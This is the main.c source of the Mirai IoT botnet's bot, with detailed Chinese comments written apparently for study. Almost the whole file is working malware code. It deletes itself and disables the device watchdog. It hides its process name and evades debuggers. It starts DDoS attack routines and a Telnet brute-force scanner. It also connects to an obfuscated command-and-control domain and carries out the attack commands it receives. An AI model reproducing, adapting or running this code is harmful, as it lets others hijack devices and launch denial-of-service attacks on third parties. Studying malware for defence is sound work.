#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "killer.h"
#include "scanner.h"
#include "util.h"
#include "resolv.h"

//bot目录下的代码才是“在受感染设备上运行的恶意payload”【mirai端，用于和远程的C&C服务器进行通信交互】

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);
static BOOL unlock_tbl_if_nodebug(char *);

struct sockaddr_in srv_addr;    //远程控制C&C服务器的socket信息
// fd_ctrl是本地ip和48101端口开放的TCP socket，绑定且监听，等待远程server的连接
// fd_serv是本地创建的连接远程server的一个本地fd。
int fd_ctrl = -1, fd_serv = -1;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry

#ifdef DEBUG
static void segv_handler(int sig, siginfo_t *si, void *unused)
{
    printf("Got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
    exit(EXIT_FAILURE);
}
#endif

int main(int argc, char **args) // ./dvrHelper id
{
    char *tbl_exec_succ;
    char name_buf[32];
    char id_buf[32];
    int name_buf_len;
    int tbl_exec_succ_len;
    int pgid, pings = 0;

#ifndef DEBUG
    sigset_t sigs;
    int wfd;

    // Delete self
    unlink(args[0]);    //一进入main函数，立即删除自身

    // Signal based control flow【基于信号的控制流变化】
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);    //屏蔽SIG_BLOCK信号
    signal(SIGCHLD, SIG_IGN);       //忽略子进程的信号
    //真的做了反gdb调试？
    signal(SIGTRAP, &anti_gdb_entry);   //如果出现SIGTRAP信号，也就是调试器产生的信号，就会设置resolve_func【解析C&C域名的ip】

    // Prevent watchdog from rebooting device
    //设置watchdog设备的计时器
    if ((wfd = open("/dev/watchdog", 2)) != -1 ||   //O_RDWR
        (wfd = open("/dev/misc/watchdog", 2)) != -1)
    {
        int one = 1;
        //watchdog.h【https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/watchdog.h#L53】
        //#define	WDIOS_DISABLECARD	0x0001 ->  Turn off the watchdog timer
        //#define	WDIOC_SETOPTIONS	_IOR(WATCHDOG_IOCTL_BASE, 4, int)   ->   0x5704
        //https://www.kernel.org/doc/Documentation/watchdog/watchdog-api.txt
        ioctl(wfd, 0x80045704, &one);   //关闭watchdog计时器。【直接就不可用了？】
        close(wfd);
        wfd = 0;
    }
    chdir("/"); //修改工作目录or当前目录
#endif

#ifdef DEBUG
    printf("DEBUG MODE YO\n");

    sleep(1);

    struct sigaction sa;

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGSEGV, &sa, NULL) == -1)
        perror("sigaction");

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGBUS, &sa, NULL) == -1)
        perror("sigaction");
#endif

    LOCAL_ADDR = util_local_addr(); //获取mirai端的ip地址信息

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;   //在调用resolve_func/resolve_cnc_addr之前，这里存储的C&C地址都是假的，调用之后才会获得真正的C&C ip和port 
    srv_addr.sin_port = htons(FAKE_CNC_PORT);   

#ifdef DEBUG
    unlock_tbl_if_nodebug(args[0]);
    anti_gdb_entry(0);
#else
    //args[0]为dvrHelper，满足时，调用table_init，并且返回true
    if (unlock_tbl_if_nodebug(args[0])) //【也就是说生成的可执行文件名称必须符合要求才能正确初始化】
        raise(SIGTRAP); //触发SIGTRAP信号，触发anti_gdb_entry中的函数赋值
#endif

    ensure_single_instance();   //确保48101端口只有一个实例在运行，且是mirai payload bot

    rand_init();    //随机数种子初始化【ppid、pid、clock、time】

    util_zero(id_buf, 32);  //id_buf来自于args[1],猜测应该是一个本地可绑定ip
    if (argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }
    //ref：https://blog.csdn.net/whatday/article/details/109253354
    // Hide argv0  
    name_buf_len = ((rand_next() % 4) + 3) * 4; //生成一个随机数
    rand_alphastr(name_buf, name_buf_len);  //生成一串随机字符
    name_buf[name_buf_len] = 0;
    util_strcpy(args[0], name_buf); //随机长度的随机字符作为进程名。【两次启动的名称不一样】
    //只会影响/proc/$pid/cmdline、ps -ef 、ps -aux
    //不会影响ps -A或/proc/$pid/status或/proc/2874/stat或top

    // Hide process name
    // PR_SET_NAME : Set the name of the calling thread【修改线程名】
    //This is the same attribute that can be set via pthread_setname_np(3) and retrieved using pthread_getname_np(3).
    name_buf_len = ((rand_next() % 6) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(PR_SET_NAME, name_buf);
    //修改了/prco/pid/stat及/prco/pid/status中的进程名称，使用ps -A 或者top 命令看不到原来的进程名称
    //但是未修改/prco/pid/cmdline 的值，使用ps -ef 、ps -aux可以看到进程名称及参数

    //mirai做的不好的一点是，argv0和prctl的修改没有统一。

    // Print out system exec
    table_unlock_val(TABLE_EXEC_SUCCESS);   //listening tun0
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);    //输出listening tun0
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);

#ifndef DEBUG
    if (fork() > 0) //fork子进程
        return 0;   //父进程结束
    pgid = setsid();    //setsid帮助一个进程脱离从父进程继承而来的已打开的终端、隶属进程组和隶属的会话。
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif
    //三个关键函数
    attack_init();  //methods的初始化【包含多种DDos攻击类型】
    killer_init();  //杀死可疑进程以及绑定22、23、80端口，不接收连接。【内部fork，而子进程定时不断kill】
#ifndef DEBUG
#ifdef MIRAI_TELNET
    scanner_init(); //利用弱口令来进行Telnet爆破。
    //首先生成随机 ip，按照字典中的用户名和密码进行登录，如果成功向 report 服务器返回结果[集齐128个可用可登录的连接就不再scan了]
#endif
#endif
    
    //又是一个 select 轮询的模型，设置 socket 和 accept 函数，初始化文件描述符
    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);  //将指定的文件描述符集清空
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);      //FD_SET:将fd加入set集合
        //fd_ctrl等待可读

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection(); //设置fd_serv为与C&C交互的本地socket【触发resolve_func，也就是anti_gdb_entry中赋值的函数】
        
        //上述函数设置了pending_connection为TRUE
        if (pending_connection) 
            FD_SET(fd_serv, &fdsetwr);  //将本地fd_serv放入fdsetwr，等待写入。[第一次]
        else
            FD_SET(fd_serv, &fdsetrd); //将本地fd_serv放入fdsetrd，等待读取。[此后都是]

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        //select轮询，10s一次，设置监听的fd集合和最大的fd值
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);   //返回需要检查的文件描述字个数
        //如果timeout->tv_sec !=0 ||timeout->tv_usec!= 0，设置select的阻塞等待时间。
        //在超时时间即将用完但又没有描述符合条件的话，返回 0。
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0) //没有fd被触发，mirai也没有接收到命令任何。
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)   //6次超时一个循环，mirai发送len=0到server，确定还活着？
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        // 由于select函数成功返回时会将未准备好的描述符位清零。
        //通常我们使用FD_ISSET是为了检查在select函数返回后，某个描述符是否准备好，以便进行接下来的处理操作。
        //也就是说现在有个cli想要接入mirai【这样mirai就会自销毁】
        // Check if we need to kill ourselves
        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))   //fd_ctrl不为空，且被激活。
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof (cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);   //mirai，接收cli端的接入请求。【阻塞直到有连接请求）

#ifdef DEBUG
            printf("[main] Detected newer instance running! Killing self\n");
#endif
#ifdef MIRAI_TELNET
            scanner_kill();     //kill 扫描scanner子进程。
#endif
            killer_kill();  //销毁自身fork出来的killer子进程
            attack_kill_all();
            kill(pgid * -1, 9);
            exit(0);    //销毁自身
        }

        // Check if CNC connection was established or timed out or errored
        if (pending_connection)     //1.除了第一次，其他情况都是FALSE
        {
            pending_connection = FALSE; //第一次循环就由TRUE变为FALSE

            if (!FD_ISSET(fd_serv, &fdsetwr))  
            {
#ifdef DEBUG
                printf("[main] Timed out while connecting to CNC\n");
#endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0)
                {
#ifdef DEBUG
                    printf("[main] Error while connecting to CNC code=%d\n", err);
#endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else     //fd_serv第一次可能会等待写入
                {
                    uint8_t id_len = util_strlen(id_buf);

                    LOCAL_ADDR = util_local_addr();
                    //第一次，mirai端完全准备好之后，主动联系server端，发送"\x00\x00\x00\x01"、argv[1]的长度和argv[1]本身(存储在id_buf中，感觉是一个本地ip)【Bot正式上线】
                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                    if (id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }
#ifdef DEBUG
                    printf("[main] Connected to CNC. Local address = %d\n", LOCAL_ADDR);
#endif
                }
            }
        }  //2、之后只会执行else分支了。第二次循环的时候fd_serv已经被加入fdsetrd集合中，等待c&c发送攻击指令
        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))  //C&C服务器的连接位置已经明确。并且本地对应fd已经connect好，加入到fdsetrd中
        {
            int n;
            uint16_t len;
            char rdbuf[1024];

            // Try to read in buffer length from CNC
            errno = 0;
            //可以发现mirai与服务器之间的自定义通讯协议是：先接收一个len
            //如果成功接收，且这个len为0，那么这也就是一个ping包，确定mirai端还活着
            //如果成功接收，但是len>1024，那么就直接close这个本地socket表示和C&C交互结束
            //如果len正常，那么接下来下一步就是接收len长度的buf数据，存储到rdbuf
            //但是这里不是马上用这个数据，一开始的rdbuf只要有数据就可以
            //之后还要再接收len，和len长度的buf数据，这时候才是真的C&C指令。
            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK); //从C&C中接收信息，
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0; // Cause connection to close
            }
            
            // If n == 0 then we close the connection!
            if (n == 0)
            {
#ifdef DEBUG
                printf("[main] Lost connection with CNC (errno = %d) 1\n", errno);
#endif
                teardown_connection();  //关闭本地连接C&C的socket fd
                continue;
            }

            // Convert length to network order and sanity check length
            if (len == 0) // If it is just a ping, no need to try to read in buffer data
            {
                recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL); // skip buffer for length
                continue;
            }
            len = ntohs(len);
            if (len > sizeof (rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
            }

            // Try to read in buffer from CNC
            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            // If n == 0 then we close the connection!
            if (n == 0)
            {
#ifdef DEBUG
                printf("[main] Lost connection with CNC (errno = %d) 2\n", errno);
#endif
                teardown_connection();
                continue;
            }

            // Actually read buffer length and buffer data
            recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

#ifdef DEBUG
            printf("[main] Received %d bytes from CNC\n", len);
#endif

            if (len > 0)
                attack_parse(rdbuf, len);  //解析命令，对指定目标发动特定的DDoS攻击！
        }
    }

    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

//解析C&C服务器，存储到srv_addr中
static void resolve_cnc_addr(void)  
{
    struct resolv_entries *entries;

    table_unlock_val(TABLE_CNC_DOMAIN); //CNC为控制服务器。解码CNC_DOMAIN即控制服务器的域名：report.changeme.com
    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));    //解析CNC服务器域名的IP【构造DNS请求】
    table_lock_val(TABLE_CNC_DOMAIN);
    if (entries == NULL)
    {
#ifdef DEBUG
        printf("[main] Failed to resolve CNC address\n");
#endif
        return;
    }
    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];    //随机选中一个解析的ip存储到srv_addr.sin_addr.s_addr中
    resolv_entries_free(entries);

    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));  //23
    table_lock_val(TABLE_CNC_PORT);

#ifdef DEBUG
    printf("[main] Resolved domain\n");
#endif
}

static void establish_connection(void)
{
#ifdef DEBUG
    printf("[main] Attempting to connect to CNC\n");
#endif

    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[main] Failed to call socket(). Errno = %d\n", errno);
#endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    // Should call resolve_cnc_addr
    if (resolve_func != NULL)
        resolve_func(); //已经在main中anti_gdb_entry由于SIGTRAP的触发，赋值为resolve_cnc_addr【给srv_addr赋值】

    pending_connection = TRUE;
    //连接C&C，将本地的相应socket对应在fd_serv中
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
}

static void teardown_connection(void)
{
#ifdef DEBUG
    printf("[main] Tearing down connection to CNC!\n");
#endif

    if (fd_serv != -1)
        close(fd_serv);
    fd_serv = -1;
    sleep(1);
}

//确保无时无刻只有单个实例在运行。
static void ensure_single_instance(void)
{
    static BOOL local_bind = TRUE;
    struct sockaddr_in addr;
    int opt = 1;

    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)  //TCP连接
        return;
    //SO_REUSEADDR是让端口释放后立即就可以被再次使用。
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));  //设置socket的SO_REUSEADDR选项：用于端口复用，允许多个套接字绑定同一个端口
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));   //设置当前socket为非阻塞模式。

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);    //48101

    // Try to bind to the control port
    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1) //尝试绑定本地ip的48101端口，等待server的连接
    {
        if (errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE; //绑定失败，说明出现了同一个ip的同一个端口绑定（只有UDP绑定才允许两者都相同，TCP的端口复用要求ip不同）
#ifdef DEBUG
        printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
#endif

        // Reset addr just in case
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;  //0.0.0.0(指的是本机上的所有IPV4地址)
        addr.sin_port = htons(SINGLE_INSTANCE_PORT);

        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)  //既然bind失败，说明本机已经开启了一个绑定了端口的实例【可能是旧的mirai也可能是别的良性用户进程】，因此connect本地ip，一般来说是要成功的，这样做到以防万一
        {
#ifdef DEBUG
            printf("[main] Failed to connect to fd_ctrl to request process termination\n");
#endif
        }
        
        sleep(5);   
        close(fd_ctrl); 
        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));   //杀死绑定这个端口的进程，重新创建mirai实例。
        ensure_single_instance(); // Call again, so that we are now the control
    }
    else
    {   //如果bind成功，就调用listen监听远程连接
        if (listen(fd_ctrl, 1) == -1)
        {
#ifdef DEBUG
            printf("[main] Failed to call listen() on fd_ctrl\n");
            close(fd_ctrl);
            sleep(5);
            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
            ensure_single_instance();
#endif
        }
#ifdef DEBUG
        printf("[main] We are the only process on this system!\n");
#endif
    }
}

//这里使用了代码混淆。
static BOOL unlock_tbl_if_nodebug(char *argv0)
{
    // ./dvrHelper = 0x2e 0x2f 0x64 0x76 0x72 0x48 0x65 0x6c 0x70 0x65 0x72
    //最终的buf_dst解析完如上
    char buf_src[18] = {0x2f, 0x2e, 0x00, 0x76, 0x64, 0x00, 0x48, 0x72, 0x00, 0x6c, 0x65, 0x00, 0x65, 0x70, 0x00, 0x00, 0x72, 0x00}, buf_dst[12];
    // buf_dst = { 0x2e, 0x2f,0x64,0x76,0x72,0x48,0x65,0x6c,0x70,0x65,0x72,0x00 }
    // ./dvrHelper 【mirai的bot binary名称为dvrhelper】
    int i, ii = 0, c = 0;
    uint8_t fold = 0xAF;
    void (*obf_funcs[]) (void) = {
        (void (*) (void))ensure_single_instance,
        (void (*) (void))table_unlock_val,
        (void (*) (void))table_retrieve_val,
        (void (*) (void))table_init, // This is the function we actually want to run【实际只是要调用table_init】
        (void (*) (void))table_lock_val,
        (void (*) (void))util_memcpy,
        (void (*) (void))util_strcmp,
        (void (*) (void))killer_init,
        (void (*) (void))anti_gdb_entry
    };
    BOOL matches;

    for (i = 0; i < 7; i++)
        c += (long)obf_funcs[i];
    if (c == 0) //如果所有函数的地址都是无效的，未解析的
        return FALSE;

    // We swap every 2 bytes: e.g. 1, 2, 3, 4 -> 2, 1, 4, 3
    for (i = 0; i < sizeof (buf_src); i += 3) //0 3 6 9 12 15 
    {
        char tmp = buf_src[i];
        //dst( from src ): 0 <-1,1 <-0,2 <-4,3 <-3,4 <- 7 ,5<- 6,6 <-10,7 <-9, 8 <-13, 9<-12, 10 <-16,11 <-15.
        //根据上述规律，其实buf_src中的\x00字符都会被过滤掉【eg：idx=2、5、8、11、14等】，剩下其他的可见字符。
        buf_dst[ii++] = buf_src[i + 1];
        buf_dst[ii++] = tmp;

        // Meaningless tautology that gets you right back where you started【冗余操作，进行完，i不会改变】
        i *= 2;
        i += 14;
        i /= 2;
        i -= 7;

        // Mess with 0xAF
        //ii=2、4、6、8、10、12
        // % 11 = 2\4\6\8\10\1
        // ./dvrHelper
        fold += ~argv0[ii % util_strlen(argv0)];
    }
    fold %= (sizeof (obf_funcs) / sizeof (void *)); //%9
    
#ifndef DEBUG
    (obf_funcs[fold])();    //(obf_funcs[3])(); 【其实对于fold到底是什么可以用排除法，显然这个函数指针是没有参数的，因此肯定不是unlock之类的，反而应该是init相关的函数】
    matches = util_strcmp(argv0, buf_dst);  
    util_zero(buf_src, sizeof (buf_src));
    util_zero(buf_dst, sizeof (buf_dst));
    return matches;
#else
    table_init();
    return TRUE;
#endif
}
